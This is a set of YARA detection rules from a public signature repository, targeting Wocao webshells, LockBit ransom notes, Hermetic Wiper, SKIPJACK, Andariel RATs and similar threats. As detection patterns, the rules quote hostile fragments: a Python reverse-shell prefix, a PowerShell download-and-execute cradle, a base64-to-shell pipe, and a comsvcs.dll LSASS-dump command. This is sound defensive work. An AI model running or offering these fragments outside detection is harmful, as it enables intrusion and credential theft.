		author = "Fox-IT SRT"
		id = "3d81a4ae-0ce0-5867-ac93-a706556481b6"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_op_wocao.yar#L195-L213"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "c3a8cddc34134faaab93ee0df0086604e4a7b031530dd65e2e8dab705483305b"
		score = 75
		quality = 85
		tags = ""

	strings:
		$a = "[+] Work completed." ascii wide
		$b = "[-] Create a new file failed." ascii wide
		$c = "[-] This is not a correct path." ascii wide
		$d = "%s [TargetPath] <Num> <SavePath>" ascii wide
		$e = "D\t%ld\t%ld\t%ld\t%d\t%d\t%s\t" ascii wide
		$f = "D\t%ld\t%ld\t%ld\t-1\t%d\t%s\t" ascii wide
		$g = "%s\t%ld\t%ld\t%ld\t%I64d\t%d\t%s\t%s" ascii wide

	condition:
		1 of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Info_Vbs_2
{
	meta:
		description = "Strings from the information grabber VBS"
		author = "Fox-IT SRT"
		id = "b719fb31-2836-5faf-a7c8-c361a14df2be"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_op_wocao.yar#L297-L316"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "e37f8768c7920b8c3d9fdd6bb3a4e748c47a6c06a8aaed01655355ef3d8c3457"
		score = 75
		quality = 85
		tags = ""

	strings:
		$ = "Logger PingConnect"
		$ = "Logger GetAdmins"
		$ = "Logger InstallPro"
		$ = "Logger Exec"
		$ = "retstr = adminsName & \" Members\" & vbCrLf & _"
		$ = "Logger VolumeName & \" (\" & objDrive.DriveLetter & \":)\" _"
		$ = "txtRes = txtRes & machine & \" can"
		$ = "retstr = \"PID   SID Image Name\" & vbCrLf & \"===="

	condition:
		4 of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Webshell_Console_Jsp_2
{
	meta:
		description = "Strings from the console.jsp webshell"
		author = "Fox-IT SRT"
		id = "1afdfc34-d2e3-58c7-80ea-ee5632e42469"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_op_wocao.yar#L318-L335"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "e70c15ef10b63a011edbcedc773a8e2917fd915c3ecc273c3bf2b78eb10fc570"
		score = 75
		quality = 85
		tags = ""

	strings:
		$a = "String strLogo = request.getParameter(\"image\")"
		$b = "!strLogo.equals(\"web.gif\")"
		$c = "<font color=red>Save Failed!</font>"
		$d = "<font color=red>Save Success!</font>"
		$e = "Save path:<br><input type=text"
		$f = "if (newfile.exists() && newfile.length()>0) { out.println"

	condition:
		1 of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Webshell_Index_Jsp_2
{
	meta:
		description = "Strings from the index.jsp socket tunnel"
		author = "Fox-IT SRT"
		id = "9c226ccd-6c69-523c-bca4-371e55274667"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_op_wocao.yar#L337-L353"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "870dad9fb5456f8edbd9f3c2d0b8764cf1143399626ce4df53c93919bcb1a0cb"
		score = 75
		quality = 85
		tags = ""

	strings:
		$x1 = "X-CMD"
		$x2 = "X-STATUS"
		$x3 = "X-TARGET"
		$x4 = "X-ERROR"
		$a = "out.print(\"All seems fine.\");"

	condition:
		all of ( $x* ) and $a
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Webshell_Webinfo_2
{
	meta:
		description = "Generic strings from webinfo.war webshells"
		author = "Fox-IT SRT"
		id = "b8477f62-f3f6-5526-b0e3-9b794fefaa1f"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_op_wocao.yar#L374-L394"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "711737a56067f24f422cc7d5aeba4389741fe18a0e66f2715fce626c3b6aef19"
		score = 75
		quality = 85
		tags = ""

	strings:
		$var1 = "String strLogo = request.getParameter"
		$var2 = "String content = request.getParameter(\"content\");"
		$var3 = "String basePath=request.getScheme()"
		$var4 = "!strLogo.equals("
		$var5 = "if(path!=null && !path.equals(\"\") && content!=null"
		$var6 = "File newfile=new File(path);"
		$str1 = "Save Success!"
		$str2 = "Save Failed!"

	condition:
		2 of ( $var* ) or ( all of ( $str* ) and 1 of ( $var* ) )
}

rule SIGNATURE_BASE_APT_Crywiper_Dec22_2
{
	meta:
		description = "Detects CryWiper malware samples"
		author = "Florian Roth (Nextron Systems)"
		id = "d56ccf4e-30ba-5308-ad68-ffc2ae5a1718"
		date = "2022-12-05"
		modified = "2023-12-05"
		reference = "https://securelist-ru.translate.goog/novyj-troyanec-crywiper/106114/?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_ru_crywiper.yar#L2-L19"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "7c22e02ed996cd820ed87a0c5d50e3264629cdd887aad4ea466cadeccaee2b2f"
		score = 75
		quality = 85
		tags = ""

	strings:
		$x1 = "Software\\Sysinternals\\BrowserUpdate"
		$sx1 = "taskkill.exe /f /im MSExchange*"
		$s1 = "SYSTEM\\CurrentControlSet\\Control\\Terminal Server" ascii
		$s2 = "fDenyTSConnections" ascii

	condition:
		1 of ( $x* ) or all of ( $s* )
}

rule SIGNATURE_BASE_Connectwise_Screenconnect_Authentication_Bypass_Feb_2024_Exploitation_IIS_Logs_2
{
	meta:
		description = "Detects an http request to '/SetupWizard.aspx/' with anything following it, which when found in IIS logs is a potential indicator of compromise of the 2024 ConnectWise ScreenConnect (versions prior to 23.9.8) vulnerability that allows an Authentication Bypass"
		author = "Huntress DE&TH Team (modified by Florian Roth)"
		id = "2886530b-e164-4c4b-b01e-950e3c40acb4"
		date = "2024-02-20"
		modified = "2024-02-21"
		reference = "https://www.connectwise.com/company/trust/security-bulletins/connectwise-screenconnect-23.9.8"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/expl_connectwise_screenconnect_vuln_feb24.yar#L3-L18"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "f6c7a3aa2ed98e754f9523c55eb035c7bc5f8aea96a6f86c729e9658d78710fb"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = " GET /SetupWizard.aspx/" ascii
		$s2 = " POST /SetupWizard.aspx/" ascii
		$s3 = " PUT /SetupWizard.aspx/" ascii
		$s4 = " HEAD /SetupWizard.aspx/" ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_MAL_SUSP_RANSOM_Lockbit_Ransomnote_Feb24_2
{
	meta:
		description = "Detects the LockBit ransom note file 'LockBit-DECRYPT.txt' which is a sign of a LockBit ransomware infection"
		author = "Florian Roth"
		id = "b2fcb2a7-49e8-520c-944f-6acd5ded579b"
		date = "2024-02-23"
		modified = "2024-04-24"
		reference = "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/expl_connectwise_screenconnect_vuln_feb24.yar#L137-L149"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "1fe07c33de1971b1f9430851dec4b8cd9f3ac7f087f0de18a2da4a390891b674"
		score = 75
		quality = 85
		tags = ""

	strings:
		$x1 = ">>>> Your personal DECRYPTION ID:"

	condition:
		1 of them
}

rule SIGNATURE_BASE_MAL_SUSP_RANSOM_Lazy_Ransomnote_Feb24_2
{
	meta:
		description = "Detects the Lazy ransom note file 'HowToRestoreYourFiles.txt' which is a sign of a Lazy ransomware infection"
		author = "Florian Roth"
		id = "287dfd67-8d0d-5906-b593-3af42a5a3aa4"
		date = "2024-02-23"
		modified = "2024-04-24"
		reference = "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/expl_connectwise_screenconnect_vuln_feb24.yar#L151-L163"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "c9416d05f0bd9aab9d6108380c1b5364f4c4e112b6e0726202f083eaacfdcf56"
		score = 75
		quality = 85
		tags = ""

	strings:
		$x1 = "All Encrypted files can be reversed to original form and become usable"

	condition:
		1 of them
}

rule SIGNATURE_BASE_SUSP_PY_Import_Statement_Apr24_1_2
{
	meta:
		description = "Detects suspicious Python import statement and socket usage often found in Python reverse shells"
		author = "Florian Roth"
		id = "8e05f9a1-40a8-5d01-9e45-8779b0ff7a45"
		date = "2024-04-15"
		modified = "2025-03-21"
		reference = "https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/vuln_paloalto_cve_2024_3400_apr24.yar#L67-L79"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "d5c199d9c3e449ca282f0ca91c94ac783709299b3489f7cec38177a2f843b504"
		score = 65
		quality = 85
		tags = ""

	strings:
		$x1 = "import sys,socket,os,pty;s=socket.socket("

	condition:
		1 of them
}

rule SIGNATURE_BASE_MAL_PY_Dimorf_2
{
	meta:
		description = "Detection for Dimorf ransomeware"
		author = "Silas Cutler"
		id = "78b53433-6926-58cd-8ec0-2195af803aab"
		date = "2023-01-03"
		modified = "2023-12-05"
		reference = "https://github.com/Ort0x36/Dimorf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_100days_of_yara_2023.yar#L224-L242"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "7499b21f77d07364983b94134a60f7c99e71a5392386437d459a196bf71852fb"
		score = 75
		quality = 85
		tags = ""
		version = "1.0"

	strings:
		$func01 = "def find_and_encrypt"
		$func02 = "def check_os"
		$comment01 = "checks if the user has permission on the file."
		$misc01 = "log_dimorf.log"
		$misc02 = ".dimorf"

	condition:
		all of them
}

rule SIGNATURE_BASE_SUSP_NK_MAL_M_Hunting_POOLRAT_2
{
	meta:
		description = "Detects strings found in POOLRAT malware"
		author = "Mandiant"
		id = "70f5f3a0-0fd0-54dc-97cc-4f3c35f02fcd"
		date = "2023-04-20"
		modified = "2023-12-05"
		old_rule_name = "APT_NK_MAL_M_Hunting_POOLRAT"
		reference = "https://www.mandiant.com/resources/blog/3cx-software-supply-chain-compromise"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_nk_tradingtech_apr23.yar#L166-L202"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "ac8db844a9c4ed961930417809afb706ea948c4509a4be1eaeed77f09c86069d"
		score = 70
		quality = 83
		tags = ""
		disclaimer = "This rule is meant for hunting and is not tested to run in a production environment"
		hash1 = "451c23709ecd5a8461ad060f6346930c"

	strings:
		$s1 = "name=\"uid\"%s%s%u%s" ascii wide
		$s2 = "name=\"session\"%s%s%u%s" ascii wide
		$s3 = "name=\"action\"%s%s%s%s" ascii wide
		$s4 = "name=\"token\"%s%s%u%s" ascii wide
		$str1 = "--N9dLfqxHNUUw8qaUPqggVTpX-" wide ascii nocase

	condition:
		any of ( $s* ) or $str1
}

rule SIGNATURE_BASE_MAL_APT_NK_Andariel_Kaosrat_Yamabot_2
{
	meta:
		description = "Detects the KaosRAT variant"
		author = "CISA.gov"
		id = "cdde69cd-1b38-52f5-8552-cef2cf4ad69c"
		date = "2024-07-25"
		modified = "2024-12-12"
		reference = "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-207a"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_nk_andariel_jul24.yar#L20-L42"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "92182aac2e56041292102b0486b7de1ee6eb3d54a9fc6786c567acd92073cd84"
		score = 70
		quality = 85
		tags = ""

	strings:
		$str1 = "/kaos/"
		$str2 = "Abstand ["
		$str3 = "] anwenden"
		$str4 = "cmVjYXB0Y2hh"
		$str5 = "/bin/sh"
		$str6 = "utilities.CIpaddress"
		$str7 = "engine.NewEgg"
		$str8 = "%s%04x%s%s%s"
		$str9 = "Y2FwdGNoYV9zZXNzaW9u"
		$str10 = "utilities.EierKochen"
		$str11 = "kandidatKaufhaus"

	condition:
		3 of them
}

rule SIGNATURE_BASE_MAL_APT_NK_Andariel_Golang_Validalpha_Tasks_2
{
	meta:
		description = "Detects a variant of the GoLang Validalpha malware"
		author = "CISA.gov"
		id = "caa67a79-3ea6-5910-971c-f311722570ff"
		date = "2024-07-25"
		modified = "2024-12-12"
		reference = "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-207a"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_nk_andariel_jul24.yar#L232-L247"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "0d3fb944888b289d345ffc8dfcc988abd04b8cabd1729a66e8236f95ee6147ee"
		score = 80
		quality = 85
		tags = ""

	strings:
		$ = "main.ScreenMonitThread"
		$ = "main.CmdShell"
		$ = "main.GetAllFoldersAndFiles"
		$ = "main.SelfDelete"

	condition:
		all of them
}

rule SIGNATURE_BASE_MAL_Hawkeye_Keylogger_Gen_Dec18_2
{
	meta:
		description = "Detects HawkEye Keylogger Reborn"
		author = "Florian Roth (Nextron Systems)"
		id = "1d06f364-a4e2-5632-ad3a-d53a8cddf072"
		date = "2018-12-10"
		modified = "2023-12-05"
		reference = "https://twitter.com/James_inthe_box/status/1072116224652324870"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_hawkeye.yar#L20-L34"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "b850f02849030d9912b7571e33e969427ac8f721d2f288ae3ac3e971c4ee4263"
		score = 75
		quality = 85
		tags = ""
		hash1 = "b8693e015660d7bd791356b352789b43bf932793457d54beae351cf7a3de4dad"

	strings:
		$s1 = "HawkEye Keylogger" fullword wide
		$s2 = "_ScreenshotLogger" ascii
		$s3 = "_PasswordStealer" ascii

	condition:
		2 of them
}

rule SIGNATURE_BASE_APT_RANSOM_Lockbit_Forensicartifacts_Nov23_2
{
	meta:
		description = "Detects patterns found in Lockbit TA attacks exploiting Citrixbleed vulnerability CVE 2023-4966"
		author = "Florian Roth"
		id = "04bde599-2a5b-5a33-a6f1-67d57a564946"
		date = "2023-11-22"
		modified = "2023-12-05"
		reference = "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-325a"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_ransom_lockbit_citrixbleed_nov23.yar#L73-L86"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "6ba1d47e2cac72143c4612c420777024f114afc007c7b15251a58819654aeff1"
		score = 75
		quality = 85
		tags = ""

	strings:
		$x1 = "taskkill /f /im sqlwriter.exe /im winmysqladmin.exe /im w3sqlmgr.exe"
		$x2 = " 1> \\\\127.0.0.1\\admin$\\__"

	condition:
		1 of ( $x* )
}

rule SIGNATURE_BASE_APT_APT28_Drovorub_Unique_Network_Comms_Strings_2
{
	meta:
		description = "Rule to detect Drovorub-server, Drovorub-agent, or Drovorub-client based"
		author = "NSA / FBI"
		id = "c6a930e8-c1c0-5d96-9051-7516df848b45"
		date = "2020-08-13"
		modified = "2023-12-05"
		reference = "https://www.nsa.gov/news-features/press-room/Article/2311407/nsa-and-fbi-expose-russian-previously-undisclosed-malware-drovorub-in-cybersecu/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_apt28_drovorub.yar#L44-L72"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "8c82766b76c36fe64c6aa99577e1997d7181dbd36a4c27329845ae8a413f5327"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s_01 = "action" wide ascii
		$s_02 = "auth.commit" wide ascii
		$s_03 = "auth.hello" wide ascii
		$s_04 = "auth.login" wide ascii
		$s_05 = "auth.pending" wide ascii
		$s_06 = "client_id" wide ascii
		$s_07 = "client_login" wide ascii
		$s_08 = "client_pass" wide ascii
		$s_09 = "clientid" wide ascii
		$s_10 = "clientkey_base64" wide ascii
		$s_11 = "file_list_request" wide ascii
		$s_12 = "module_list_request" wide ascii
		$s_13 = "monitor" wide ascii
		$s_14 = "net_list_request" wide ascii
		$s_15 = "server finished" wide ascii
		$s_16 = "serverid" wide ascii
		$s_17 = "tunnel" wide ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_SUSP_Script_Obfuscation_Char_Concat_2
{
	meta:
		description = "Detects strings found in sample from CN group repo leak in October 2018"
		author = "Florian Roth (Nextron Systems)"
		id = "6d3bfdfd-ef8f-5740-ac1f-5835c7ce0f43"
		date = "2018-10-04"
		modified = "2025-03-21"
		reference = "https://twitter.com/JaromirHorejsi/status/1047084277920411648"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_suspicious_strings.yar#L188-L200"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "28b648e0e1c22fefa49a937f40bd4ed09c5d3894ff059979bad69e8bc98fcac2"
		score = 65
		quality = 85
		tags = ""
		hash1 = "b30cc10e915a23c7273f0838297e0d2c9f4fc0ac1f56100eef6479c9d036c12b"

	strings:
		$s1 = "\"c\" & \"r\" & \"i\" & \"p\" & \"t\"" ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_SUSP_Powershell_IEX_Download_Combo_2
{
	meta:
		description = "Detects strings found in sample from CN group repo leak in October 2018"
		author = "Florian Roth (Nextron Systems)"
		id = "1dfedcb0-345c-548c-85ac-3c1e78bfd9e2"
		date = "2018-10-04"
		modified = "2025-03-21"
		reference = "https://twitter.com/JaromirHorejsi/status/1047084277920411648"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_suspicious_strings.yar#L202-L218"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "0a1507859354e0e0d9284befcf777c4d3883496eb96524a246a1df4f3a247aa9"
		score = 65
		quality = 85
		tags = ""
		hash1 = "13297f64a5f4dd9b08922c18ab100d3a3e6fdeab82f60a4653ab975b8ce393d5"

	strings:
		$x1 = "IEX ((new-object net.webclient).download" ascii nocase
		$fp1 = "chocolatey.org"
		$fp2 = "Remote Desktop in the Appveyor"
		$fp3 = "/appveyor/" ascii

	condition:
		$x1 and not 1 of ( $fp* )
}

rule SIGNATURE_BASE_SUSP_Netsh_Portproxy_Command_2
{
	meta:
		description = "Detects a suspicious command line with netsh and the portproxy command"
		author = "Florian Roth (Nextron Systems)"
		id = "cbbd2042-572c-5283-bd45-e745b36733ad"
		date = "2019-04-20"
		modified = "2025-03-21"
		reference = "https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-interface-portproxy"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_suspicious_strings.yar#L295-L308"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "dbf82a908e77886af1c31c51f5f6684015cbcb22bf28876c2e1b0dd1ea5bd2b4"
		score = 65
		quality = 85
		tags = ""
		hash1 = "9b33a03e336d0d02750a75efa1b9b6b2ab78b00174582a9b2cb09cd828baea09"

	strings:
		$x1 = "netsh interface portproxy add v4tov4 listenport=" ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_SUSP_Disable_ETW_Jun20_1_2
{
	meta:
		description = "Detects method to disable ETW in ENV vars before executing a program"
		author = "Florian Roth (Nextron Systems)"
		id = "ea5dee09-959e-5ef2-8f84-5497bdef0a05"
		date = "2020-06-06"
		modified = "2025-03-21"
		reference = "https://gist.github.com/Cyb3rWard0g/a4a115fd3ab518a0e593525a379adee3"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_suspicious_strings.yar#L395-L413"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "182ad2512bcfbcd92d13380113b32982eb367e458019f07038a12f494dfbebb6"
		score = 65
		quality = 85
		tags = ""

	strings:
		$x1 = "set COMPlus_ETWEnabled=0" ascii wide fullword
		$x2 = "$env:COMPlus_ETWEnabled=0" ascii wide fullword
		$s1 = "Software\\Microsoft.NETFramework" ascii wide
		$sa1 = "/v ETWEnabled" ascii wide fullword
		$sa2 = " /d 0" ascii wide
		$sb4 = "-Name ETWEnabled"
		$sb5 = " -Value 0 "

	condition:
		1 of ( $x* ) or 3 of them
}

rule SIGNATURE_BASE_APT_MAL_LUA_Hunting_SKIPJACK_1_2
{
	meta:
		description = "Hunting rule looking for strings observed in SKIPJACK installation script."
		author = "Mandiant"
		id = "0026375c-7f37-5ef9-bd55-5b9fc499e5d2"
		date = "2023-06-15"
		modified = "2023-12-05"
		reference = "https://www.mandiant.com/resources/blog/barracuda-esg-exploited-globally"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_barracuda_esg_unc4841_jun23.yar#L175-L193"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "e4e86c273a2b67a605f5d4686783e0cc"
		logic_hash = "8890cd9ab8190f12997e0653e43c89816df03c7bd41842e5ad21b1986819843e"
		score = 70
		quality = 85
		tags = ""

	strings:
		$str1 = "hdr:name() == 'Content-ID'" base64
		$str2 = "hdr:body() ~= nil" base64
		$str3 = "string.match(hdr:body(),\"^[%w%+/=\\r\\n]+$\")" base64
		$str4 = "openssl aes-256-cbc" base64
		$str5 = "mod_content.lua"
		$str6 = "#!/bin/sh"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_LUA_Hunting_Lua_SKIPJACK_2_2
{
	meta:
		description = "Hunting rule looking for strings observed in SKIPJACK samples."
		author = "Mandiant"
		id = "e1eac294-fe60-5bb2-bae4-0f7bcbe6b1db"
		date = "2023-06-15"
		modified = "2023-12-05"
		reference = "https://www.mandiant.com/resources/blog/barracuda-esg-exploited-globally"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_barracuda_esg_unc4841_jun23.yar#L195-L212"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "87847445f9524671022d70f2a812728f"
		logic_hash = "093e8857c410bd30a076f87ef63d7e1e66f50e3dce75b4add67161782386ee24"
		score = 70
		quality = 85
		tags = ""

	strings:
		$str1 = "hdr:name() == 'Content-ID'"
		$str2 = "hdr:body() ~= nil"
		$str3 = "string.match(hdr:body(),\"^[%w%+/=\\r\\n]+$\")"
		$str4 = "openssl aes-256-cbc"
		$str5 = "| base64 -d| sh 2>"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_LUA_Hunting_Lua_SEASPRAY_1_2
{
	meta:
		description = "Hunting rule looking for strings observed in SEASPRAY samples."
		author = "Mandiant"
		id = "8c744b85-b61e-56d0-8a9e-ae6a954e1b95"
		date = "2023-06-15"
		modified = "2023-12-05"
		reference = "https://www.mandiant.com/resources/blog/barracuda-esg-exploited-globally"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_barracuda_esg_unc4841_jun23.yar#L213-L228"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "35cf6faf442d325961935f660e2ab5a0"
		logic_hash = "856bfb47557b60f69aa1141477d6ce446ea13ebbe899022d7996ceef08bdefbb"
		score = 70
		quality = 85
		tags = ""

	strings:
		$str1 = "string.find(attachment:filename(),'obt075') ~= nil"
		$str2 = "os.execute('cp '..tostring(tmpfile)..' /tmp/'..attachment:filename())"
		$str3 = "os.execute('rverify'..' /tmp/'..attachment:filename())"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_UA_Hermetic_Wiper_Artefacts_Feb22_1_2
{
	meta:
		description = "Detects artefacts found in Hermetic Wiper malware related intrusions"
		author = "Florian Roth (Nextron Systems)"
		id = "77f793c1-b02c-59c3-b3e4-75758f5b3b8d"
		date = "2022-02-25"
		modified = "2023-12-05"
		reference = "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ukraine-wiper-malware-russia"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_ua_hermetic_wiper.yar#L40-L70"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "5e917618a5172c68b4b32ba9e63402c2a98ccb027276b317ec169a4fef219de1"
		score = 75
		quality = 85
		tags = ""

	strings:
		$sx1 = "/c powershell -c \"rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump" ascii wide
		$sx2 = "appdata\\local\\microsoft\\windows\\winupd.log" ascii wide
		$sx3 = "AppData\\Local\\Microsoft\\Windows\\Winupd.log" ascii wide
		$sx4 = "CSIDL_SYSTEM_DRIVE\\temp\\sys.tmp1" ascii wide
		$sx5 = "\\policydefinitions\\postgresql.exe" ascii wide
		$sx6 = "powershell -v 2 -exec bypass -File text.ps1" ascii wide
		$sx7 = "powershell -exec bypass gp.ps1" ascii wide
		$sx8 = "powershell -exec bypass -File link.ps1" ascii wide
		$sx9 = " 1> \\\\127.0.0.1\\ADMIN$\\__16" ascii wide
		$sa1 = "(New-Object System.Net.WebClient).DownloadFile(" ascii wide
		$sa2 = "CSIDL_SYSTEM_DRIVE\\temp\\" ascii wide
		$sa3 = "1> \\\\127.0.0.1\\ADMIN$" ascii wide
		$fp1 = "<html" ascii

	condition:
		1 of ( $sx* ) or all of ( $sa* ) and not 1 of ( $fp* )
}

rule SIGNATURE_BASE_APT_UA_Hermetic_Wiper_Scheduled_Task_Feb22_1_2
{
	meta:
		description = "Detects scheduled task pattern found in Hermetic Wiper malware related intrusions"
		author = "Florian Roth (Nextron Systems)"
		id = "a628f773-9c71-5979-a4db-37b6b6bd6a56"
		date = "2022-02-25"
		modified = "2023-12-05"
		reference = "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ukraine-wiper-malware-russia"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_ua_hermetic_wiper.yar#L72-L88"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "56368ba1c97fe3455312b6ee86dcd1a21677f7dfa3836e76ada4b236a5b2c171"
		score = 85
		quality = 85
		tags = ""

	strings:
		$a0 = "<Task version=" ascii wide
		$sa1 = "CSIDL_SYSTEM_DRIVE\\temp" ascii wide
		$sa2 = "postgresql.exe 1> \\\\127.0.0.1\\ADMIN$" ascii wide
		$sa3 = "cmd.exe /Q /c move CSIDL_SYSTEM_DRIVE" ascii wide

	condition:
		$a0 and 1 of ( $s* )
}

